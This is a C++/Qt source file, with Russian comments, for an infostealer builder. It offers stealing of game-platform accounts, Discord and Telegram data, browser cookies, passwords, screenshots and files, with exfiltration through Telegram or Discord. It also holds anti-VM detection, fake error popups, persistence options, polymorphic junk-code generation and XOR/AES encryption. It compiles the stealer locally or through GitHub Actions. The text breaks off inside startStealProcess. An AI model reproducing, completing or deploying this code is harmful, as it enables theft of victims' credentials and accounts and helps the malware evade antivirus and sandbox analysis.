#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>

// Класс для выполнения кражи данных в отдельном потоке
class StealerWorker : public QObject {
    Q_OBJECT
public:
    StealerWorker(MainWindow* window, const std::string& tempDir) : window(window), tempDir(tempDir) {}
    ~StealerWorker() {}

public slots:
    void process() {
        window->StealAndSendData(tempDir);
        emit finished();
    }

signals:
    void finished();

private:
    MainWindow* window;
    std::string tempDir;
};

// Функция для получения данных от libcurl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    s->append((char*)contents, newLength);
    return newLength;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? config.encryptionKey1 : config.encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateUniqueXorKey();
        if (useFirstKey) {
            config.encryptionKey1 = keyStr;
        } else {
            config.encryptionKey2 = keyStr;
        }
    }

    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 32) {
        for (size_t i = 0; i < 16; ++i) {
            std::string byteStr = keyStr.substr(i * 2, 2);
            key[i] = static_cast<unsigned char>(std::stoi(byteStr, nullptr, 16));
        }
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Генерация инициализационного вектора (IV)
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (auto& byte : iv) {
        byte = static_cast<unsigned char>(dis(gen));
    }
    return iv;
}

// Применение XOR-шифрования
QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Применение AES-шифрования
QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES\n");
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось установить режим цепочки AES\n");
        return QByteArray();
    }

    DWORD keyObjectSize = 0, dataSize = 0;
    DWORD cbResult = 0;
    if (!BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectSize, sizeof(DWORD), &cbResult, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось получить размер объекта ключа AES\n");
        return QByteArray();
    }

    std::vector<BYTE> keyObject(keyObjectSize);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectSize, (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось сгенерировать ключ AES\n");
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), nullptr, 0, &dataSize, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось вычислить размер зашифрованных данных\n");
        return QByteArray();
    }

    std::vector<BYTE> encryptedData(dataSize);
    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), encryptedData.data(), dataSize, &cbResult, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось зашифровать данные\n");
        return QByteArray();
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return QByteArray((char*)encryptedData.data(), cbResult);
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    bool isVM = false;

    // Проверка реестра на наличие признаков виртуальной машины
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t value[512];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, L"0", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (wcsstr(value, L"VMware") || wcsstr(value, L"VirtualBox") || wcsstr(value, L"QEMU")) {
                isVM = true;
            }
        }
        RegCloseKey(hKey);
    }

    // Проверка количества процессоров
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 1) isVM = true;

    // Проверка объёма памяти
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(memInfo);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) isVM = true;

    // Проверка процессов, связанных с виртуальными машинами
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hProcessSnap, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::towlower);
                if (processName.find(L"vmtoolsd.exe") != std::wstring::npos ||
                    processName.find(L"vboxservice.exe") != std::wstring::npos ||
                    processName.find(L"qemu-ga.exe") != std::wstring::npos) {
                    isVM = true;
                    break;
                }
            } while (Process32NextW(hProcessSnap, &pe32));
        }
        CloseHandle(hProcessSnap);
    }

    // Проверка MAC-адреса (виртуальные машины часто используют специфические префиксы)
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->AddressLength >= 3) {
                if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x05 && pAdapter->Address[2] == 0x69)) {
                    isVM = true;
                    break;
                }
            }
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);

    return isVM;
}

// Проверка на запуск в виртуальной машине (альтернативный метод)
bool MainWindow::AntiAnalysis() {
    return isRunningInVM();
}

// Удобный метод для вызова сигнала logUpdated
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    emit logUpdated(message);
}

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);

    // Инициализация UI элементов
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->filenameLineEdit;
    encryptionKey1LineEdit = ui->encryptionKey1LineEdit;
    encryptionKey2LineEdit = ui->encryptionKey2LineEdit;
    encryptionSaltLineEdit = ui->encryptionSaltLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;
    githubRepoLineEdit = ui->githubRepoLineEdit;
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Инициализация значений по умолчанию
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});

    // Анимация для логотипа
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    // Анимация пульсации для кнопки "Собрать"
    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::on_actionSaveConfig_triggered);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::on_actionLoadConfig_triggered);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::on_actionExportLogs_triggered);
    connect(ui->actionExit, &QAction::triggered, this, &MainWindow::on_actionExit_triggered);
    connect(ui->actionAbout, &QAction::triggered, this, &MainWindow::on_actionAbout_triggered);
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);

    // Подключение таймеров
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
}

void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer)
{
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

MainWindow::~MainWindow()
{
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
}

void MainWindow::generatePolymorphicCode()
{
    std::ofstream polyFile("polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h. Проверьте права доступа.\n");
        isBuilding = false;
        return;
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n";
    polyFile << "#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n";
    polyFile << "#include <string>\n";
    polyFile << "#include <sstream>\n";
    polyFile << "#include <iomanip>\n";
    polyFile << "#include <chrono>\n";
    polyFile << "#include <thread>\n\n";
    polyFile << "// Этот файл перегенерируется динамически в mainwindow.cpp через generatePolymorphicCode()\n\n";

    // Генерация getRandomNumber
    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n";
    polyFile << "    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    polyFile << "    return dis(gen);\n";
    polyFile << "}\n\n";

    // Генерация generateRandomString
    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] =\n";
    polyFile << "        \"0123456789\"\n";
    polyFile << "        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n";
    polyFile << "        \"abcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n";
    polyFile << "    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n";
    polyFile << "    }\n";
    polyFile << "    return result;\n";
    polyFile << "}\n\n";

    // Генерация generateRandomFuncName
    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999) << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n";
    polyFile << "}\n\n";

    polyFile << "namespace Polymorphic {\n\n";

    // Генерация 5–10 полиморфных функций
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    // Генерация executePolymorphicCode
    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";

    polyFile << "} // namespace Polymorphic\n\n";
    polyFile << "#endif // POLYMORPHIC_CODE_H\n";

    polyFile.close();
    emitLog("Полиморфный код сгенерирован в polymorphic_code.h\n");
}

void MainWindow::generateBuildKeyHeader()
{
    std::ofstream keyFile("build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h. Проверьте права доступа.\n");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n";
    keyFile << "#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n";
    keyFile << "#include <string>\n\n";
    keyFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateBuildKeyHeader()\n\n";

    keyFile << "inline std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& keyStr) {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    if (keyStr.length() >= 32) {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            std::string byteStr = keyStr.substr(i * 2, 2);\n";
    keyFile << "            key[i] = static_cast<unsigned char>(std::stoi(byteStr, nullptr, 16));\n";
    keyFile << "        }\n";
    keyFile << "    } else {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);\n";
    keyFile << "        }\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 16; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateRandomSalt() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 8; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "#endif // BUILD_KEY_H\n";

    keyFile.close();
    emitLog("Файл ключей шифрования сгенерирован в build_key.h\n");
}

void MainWindow::copyIconToBuild()
{
    QString iconPath = ui->iconPathLineEdit->text();
    if (!iconPath.isEmpty()) {
        try {
            std::filesystem::copy_file(iconPath.toStdString(), "icon.ico", std::filesystem::copy_options::overwrite_existing);
            emitLog("Иконка скопирована в директорию сборки: icon.ico\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования иконки: " + QString::fromStdString(e.what()) + "\n");
            isBuilding = false;
        }
    }
}

void MainWindow::buildExecutable()
{
    // Генерация мусорного кода (имитация)
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 5000);
    volatile int dummy = dis(gen);
    for (int i = 0; i < dummy; ++i) {
        dummy ^= (dummy << 1) ^ (dummy >> 1);
    }
    emitLog("Выполнен мусорный код перед началом сборки\n");

    std::string buildDir = std::string(std::getenv("TEMP")) + "\\DeadCode_Build_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(buildDir));
    emitLog("Создана директория для сборки: " + QString::fromStdString(buildDir) + "\n");

    try {
        std::filesystem::create_directories(buildDir + "\\src");
        for (const auto& entry : std::filesystem::directory_iterator(".")) {
            if (entry.path().filename() == "mainwindow.h" ||
                entry.path().filename() == "mainwindow.cpp" ||
                entry.path().filename() == "main.cpp" ||
                entry.path().filename() == "mainwindow.ui" ||
                entry.path().filename() == "polymorphic_code.h" ||
                entry.path().filename() == "build_key.h") {
                std::filesystem::copy_file(entry.path(), buildDir + "\\src\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
            }
        }
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            std::filesystem::copy_file(ui->iconPathLineEdit->text().toStdString(), buildDir + "\\icon.ico", std::filesystem::copy_options::overwrite_existing);
        }
        emitLog("Исходные файлы скопированы в " + QString::fromStdString(buildDir) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования исходных файлов: " + QString::fromStdString(e.what()) + "\n");
        isBuilding = false;
        return;
    }

    std::ofstream proFile(buildDir + "\\stealer.pro");
    if (proFile.is_open()) {
        proFile << "QT += core gui network\n";
        proFile << "greaterThan(QT_MAJOR_VERSION, 4): QT += widgets\n";
        proFile << "TARGET = " << config.filename.substr(0, config.filename.find(".exe")) << "\n";
        proFile << "TEMPLATE = app\n";
        proFile << "SOURCES += src/main.cpp src/mainwindow.cpp\n";
        proFile << "HEADERS += src/mainwindow.h src/polymorphic_code.h src/build_key.h\n";
        proFile << "FORMS += src/mainwindow.ui\n";
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            proFile << "RC_ICONS = icon.ico\n";
        }
        proFile << "LIBS += -luser32 -lbcrypt -lsqlite3 -lzip -lcurl\n";
        proFile.close();
        emitLog("Сгенерирован файл проекта: stealer.pro\n");
    } else {
        emitLog("Ошибка: Не удалось создать stealer.pro\n");
        isBuilding = false;
        return;
    }

    QProcess process;
    process.setWorkingDirectory(QString::fromStdString(buildDir));

    QString qmakePath = QStandardPaths::findExecutable("qmake");
    QString makePath = QStandardPaths::findExecutable("mingw32-make");
    if (qmakePath.isEmpty() || makePath.isEmpty()) {
        QString qtDir = qgetenv("QT_DIR");
        if (!qtDir.isEmpty()) {
            qmakePath = qtDir + "/bin/qmake.exe";
            makePath = qtDir + "/../mingw/bin/mingw32-make.exe";
        } else {
            emitLog("Ошибка: qmake или mingw32-make не найдены. Убедитесь, что Qt и MinGW установлены и добавлены в PATH.\n");
            isBuilding = false;
            return;
        }
    }

    process.start(qmakePath, QStringList() << "stealer.pro");
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения qmake: " + process.readAllStandardError() + "\n");
        isBuilding = false;
        return;
    }
    emitLog("qmake выполнен успешно\n");

    process.start(makePath);
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения mingw32-make: " + process.readAllStandardError() + "\n");
        isBuilding = false;
        return;
    }
    emitLog("mingw32-make выполнен успешно\n");

    std::string exePath = buildDir + "\\release\\" + config.filename;
    std::string outputPath = QDir::currentPath().toStdString() + "\\" + config.filename;
    try {
        std::filesystem::copy_file(exePath, outputPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Готовый билд сохранен: " + QString::fromStdString(outputPath) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования билда: " + QString::fromStdString(e.what()) + "\n");
        isBuilding = false;
        return;
    }

    try {
        std::filesystem::remove_all(buildDir);
        emitLog("Временная директория сборки удалена\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()) + "\n");
    }

    isBuilding = false;
    ui->statusbar->showMessage("Сборка завершена", 0);
    emit startStealSignal();
}

void MainWindow::triggerGitHubActions()
{
    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны\n");
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QByteArray data = QJsonDocument(json).toJson();

    QNetworkReply *reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            emitLog("Сборка успешно запущена через GitHub Actions\n");
            QJsonObject response = QJsonDocument::fromJson(reply->readAll()).object();
            workflowRunId = response["id"].toString();
            if (workflowRunId.isEmpty()) {
                emitLog("Ошибка: Не удалось получить ID workflow\n");
                isBuilding = false;
            } else {
                statusCheckTimer->start(30000);
            }
        } else {
            emitLog("Ошибка запуска GitHub Actions: " + reply->errorString() + "\n");
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

void MainWindow::checkBuildStatus()
{
    if (workflowRunId.isEmpty()) {
        emitLog("Ошибка: ID workflow не установлен\n");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны\n");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply *reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonObject json = QJsonDocument::fromJson(reply->readAll()).object();
            QString status = json["status"].toString();
            QString conclusion = json["conclusion"].toString();
            emitLog("Статус сборки GitHub Actions: " + status + " (Conclusion: " + conclusion + ")\n");
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emitLog("Сборка успешно завершена через GitHub Actions\n");
                    emit startStealSignal();
                } else {
                    emitLog("Сборка завершилась с ошибкой\n");
                    isBuilding = false;
                }
            }
        } else {
            emitLog("Ошибка проверки статуса GitHub Actions: " + reply->errorString() + "\n");
            statusCheckTimer->stop();
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

void MainWindow::startStealProcess()
{
    if (config.antiVM && isRunningInVM()) {
        emitLog("Обнаружена виртуальная машина. Завершение работы.\n");
        FakeError();
        exitApp();
        return;
    }
    if (config.fakeError) FakeError();
